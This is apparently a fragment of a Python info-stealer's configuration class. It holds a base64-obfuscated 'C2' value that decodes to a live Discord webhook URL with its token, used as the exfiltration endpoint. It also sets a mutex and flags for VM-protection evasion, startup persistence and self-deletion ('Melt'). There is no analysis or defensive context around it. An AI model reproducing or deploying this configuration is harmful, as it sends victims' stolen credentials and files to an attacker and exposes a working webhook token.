...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5NTY5OTk0NTI0ODkxOTU3My9MUUZCSFFESm1scWtuanR2NUV5UlV3N3FTRExTWU04aUdqbW0xejl1SDA0RmwxQnBoemVwSlpXdm9nY3N6TU1fNHBBNA==').decode())
    Mutex = base64.b64decode('ZWN2bU4wb1JXdThmZnRCRw==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
